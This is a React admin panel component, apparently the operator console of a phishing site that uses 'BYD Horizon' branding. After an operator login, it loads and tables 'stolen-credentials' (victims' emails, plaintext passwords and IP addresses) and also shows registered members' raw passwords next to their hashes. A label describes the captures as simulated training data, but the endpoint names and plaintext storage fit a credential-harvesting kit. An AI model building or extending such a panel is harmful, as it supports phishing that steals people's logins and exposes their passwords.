import React, { useState, useEffect } from "react";
import { KeyRound, ShieldAlert, Users, RefreshCw, Lock } from "lucide-react";

interface AdminPanelProps {
  onNavigate: (view: "landing" | "payment" | "dashboard" | "admin" | "help", params?: any) => void;
}

export default function AdminPanel({ onNavigate }: AdminPanelProps) {
  const [isAdmin, setIsAdmin] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [errorLogin, setErrorLogin] = useState("");
  const [adminToken, setAdminToken] = useState("");
  const [users, setUsers] = useState<any[]>([]);
  const [allCredentials, setAllCredentials] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);

  const loadMetrics = async (token = adminToken) => {
    setLoading(true);
    try {
      const headers = { "Authorization": `Bearer ${token}` };
      
      // Always load registered users credentials
      const resU = await fetch("/api/admin/users", { headers });
      const listU = await resU.json();
      setUsers(Array.isArray(listU) ? listU : []);

      // Always load phished credentials
      const resCr = await fetch("/api/admin/stolen-credentials", { headers });
      const listCr = await resCr.json();
      setAllCredentials(Array.isArray(listCr) ? listCr : []);
    } catch (err) {
      console.error("Failed to load admin nodes", err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (isAdmin && adminToken) {
      loadMetrics(adminToken);
    }
  }, [isAdmin, adminToken]);

  const handleAdminLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorLogin("");
    
    try {
      const res = await fetch("/api/admin/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password })
      });
      const data = await res.json();
      
      if (res.ok) {
        setAdminToken(data.token);
        setIsAdmin(true);
      } else {
        setErrorLogin(data.error || "Access denied.");
      }
    } catch {
      setErrorLogin("Internal connection failure.");
    }
  };

  if (!isAdmin) {
    return (
      <div className="w-full max-w-md mx-auto my-12 bg-slate-900 border border-slate-800 rounded-3xl p-8 shadow-2xl animate-fade-in" id="admin-login-node">
        <div className="text-center space-y-3 mb-6">
          <div className="mx-auto w-12 h-12 rounded-2xl bg-orange-600/10 border border-orange-500/20 flex items-center justify-center">
            <KeyRound className="w-6 h-6 text-orange-400" />
          </div>
          <h2 className="font-display text-xl font-bold text-white tracking-tight">BYD Horizon Audit Clearance</h2>
          <p className="text-xs text-slate-400 mt-1 uppercase font-mono tracking-wider">Secured Operating console</p>
        </div>

        <form onSubmit={handleAdminLogin} className="space-y-4">
          <div className="space-y-1">
            <label className="block text-[10px] font-bold uppercase tracking-widest text-slate-500 font-mono">Operator ID</label>
            <input 
              type="text" 
              required
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              placeholder="System Username"
              className="w-full bg-slate-950 border border-slate-850 p-3 rounded-xl text-xs text-white font-mono focus:outline-none focus:border-orange-500/50 focus:ring-1 focus:ring-orange-500/20"
            />
          </div>

          <div className="space-y-1">
            <label className="block text-[10px] font-bold uppercase tracking-widest text-slate-500 font-mono">Bypass Key Phrase</label>
            <input 
              type="password" 
              required
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Operator Password"
              className="w-full bg-slate-950 border border-slate-850 p-3 rounded-xl text-xs text-white font-mono focus:outline-none focus:border-orange-500/50 focus:ring-1 focus:ring-orange-500/20"
            />
          </div>

          {errorLogin && (
            <div className="p-3 bg-red-950/20 border border-red-500/20 text-red-400 rounded-xl text-[11px] font-mono flex items-center space-x-2">
              <ShieldAlert className="w-4 h-4 shrink-0" />
              <span>{errorLogin}</span>
            </div>
          )}

          <button 
            type="submit"
            className="w-full py-3 bg-gradient-to-r from-orange-600 to-amber-600 hover:from-orange-500 hover:to-amber-500 text-white font-bold uppercase text-[10px] tracking-wider rounded-xl transition shadow-lg cursor-pointer"
          >
            Authenticate clearance ➔
          </button>
        </form>

        <div className="mt-6 border-t border-slate-800/60 pt-4 text-center">
          <button 
            onClick={() => onNavigate("landing")}
            className="text-[10px] text-slate-400 font-mono hover:text-slate-200 transition"
          >
            ← Return to public homepage
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="w-full text-xs sm:text-sm" id="admin-dashboard-panel">
      {/* Admin header */}
      <header className="bg-slate-900 border-b border-slate-800 p-6 rounded-2xl flex flex-col md:flex-row justify-between items-start md:items-center space-y-4 md:space-y-0 shadow-lg mb-8 animate-fade-in">
        <div>
          <h2 className="font-display text-xl sm:text-2xl font-bold text-white flex items-center space-x-2">
            <span className="h-2.5 w-2.5 rounded-full bg-orange-500 animate-ping"></span>
            <span>Horizon Administrator Console</span>
          </h2>
          <p className="text-xs text-slate-500 font-mono mt-0.5">Database status: ONLINE | Credentials Access: AUTHORIZED</p>
        </div>

        <div className="flex space-x-2 font-mono">
          <button 
            onClick={() => loadMetrics()}
            disabled={loading}
            className="p-2 bg-slate-950 hover:bg-slate-850 border border-slate-850 rounded-xl text-[10px] uppercase font-bold tracking-wider text-slate-300 flex items-center space-x-1.5 cursor-pointer transition disabled:opacity-50"
          >
            <RefreshCw className={`w-3.5 h-3.5 text-cyan-400 ${loading ? 'animate-spin' : ''}`} />
            <span>Sync Credentials API</span>
          </button>
          <button 
            onClick={() => { setIsAdmin(false); setAdminToken(""); }}
            className="p-2 bg-red-950/20 border border-red-500/20 hover:bg-red-950/40 rounded-xl text-[10px] uppercase font-bold text-red-400 cursor-pointer transition"
          >
            Sign-out Access
          </button>
        </div>
      </header>

      {/* Database Credentials Portal */}
      <div className="grid grid-cols-1 xl:grid-cols-2 gap-8 items-start animate-fade-in">
        
        {/* Card 1: Registered Users & SHA-256 Passcodes */}
        <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl space-y-4">
          <div className="flex justify-between items-center border-b border-slate-800 pb-3">
            <div>
              <h3 className="font-display font-semibold text-base text-slate-100 flex items-center space-x-2">
                <Users className="w-4 h-4 text-cyan-400" />
                <span>Registered Member Credentials</span>
              </h3>
              <p className="text-xs text-slate-400 mt-1">Authentic member profiles with SHA-256 password hash values.</p>
            </div>
            <span className="bg-cyan-500/15 text-cyan-400 border border-cyan-500/30 rounded px-2.5 py-1 text-[10px] font-mono font-bold uppercase shrink-0">
              {users.length} Active Users
            </span>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left font-mono text-[11px] text-slate-300">
              <thead className="bg-slate-950 border-b border-slate-850 text-slate-500">
                <tr>
                  <th className="p-3">User & Contact</th>
                  <th className="p-3">E-mail Node</th>
                  <th className="p-3 text-emerald-450">Active Login Password</th>
                  <th className="p-3">Origin City</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-850/60">
                {users.length === 0 ? (
                  <tr>
                    <td colSpan={4} className="p-4 text-center text-slate-600">No registered members recorded in SQLite ledger.</td>
                  </tr>
                ) : (
                  users.map((u: any) => (
                    <tr key={u.id} className="hover:bg-slate-950/40 animate-fade-in">
                      <td className="p-3">
                        <span className="font-bold text-slate-200 block text-xs">{u.name}</span>
                        <span className="text-[10px] text-slate-500 block mt-0.5">Phone: {u.phone}</span>
                      </td>
                      <td className="p-3 text-cyan-400 select-all font-semibold break-all max-w-[150px]">{u.email}</td>
                      <td className="p-3 select-all font-semibold text-emerald-400 break-all max-w-[220px]">
                        <div className="flex flex-col gap-0.5">
                          {u.password_raw ? (
                            <>
                              <span className="text-emerald-400 text-[11px] font-extrabold uppercase tracking-wide">PLAIN: {u.password_raw}</span>
                              <span className="text-[9px] text-slate-550 font-normal">HASH: {u.password_hash?.substring(0, 16)}...</span>
                            </>
                          ) : (
                            <span className="text-amber-500 text-[10px] break-all">HASH ONLY: {u.password_hash || "N/A"}</span>
                          )}
                        </div>
                      </td>
                      <td className="p-3 text-slate-450 text-[11px]">{u.city || "N/A"}</td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>

        {/* Card 2: Phished / Simulated Credentials Log */}
        <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl space-y-4">
          <div className="flex justify-between items-center border-b border-slate-800 pb-3">
            <div>
              <h3 className="font-display font-semibold text-base text-slate-100 flex items-center space-x-2">
                <Lock className="w-4 h-4 text-rose-400 animate-pulse" />
                <span>Phished Credentials Audit Log</span>
              </h3>
              <p className="text-xs text-slate-400 mt-1">Simulated phished logins from employee awareness training modules.</p>
            </div>
            <span className="bg-rose-500/15 text-rose-400 border border-rose-500/30 rounded px-2.5 py-1 text-[10px] font-mono font-bold uppercase shrink-0">
              {allCredentials.length} Captures
            </span>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left font-mono text-[11px] text-slate-300">
              <thead className="bg-slate-950 border-b border-slate-850 text-slate-500">
                <tr>
                  <th className="p-3">Capture Date / Time</th>
                  <th className="p-3">Target E-mail Node</th>
                  <th className="p-3 text-rose-400">Decrypted Plain Password</th>
                  <th className="p-3">IP Host Origin</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-850/60">
                {allCredentials.length === 0 ? (
                  <tr>
                    <td colSpan={4} className="p-4 text-center text-slate-600">No captured credentials recorded.</td>
                  </tr>
                ) : (
                  allCredentials.map((cr: any) => (
                    <tr key={cr.id} className="hover:bg-slate-950/40 animate-fade-in">
                      <td className="p-3 text-[10px] text-slate-450">
                        {cr.created_at ? new Date(cr.created_at).toLocaleString() : "N/A"}
                      </td>
                      <td className="p-3 font-semibold text-white select-all break-all max-w-[150px]">{cr.email}</td>
                      <td className="p-3 text-rose-400 font-bold select-all tracking-wide break-all max-w-[150px]">{cr.password}</td>
                      <td className="p-3 text-[10px] text-slate-500">{cr.ip_address || "127.0.0.1"}</td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>

      </div>

    </div>
  );
}
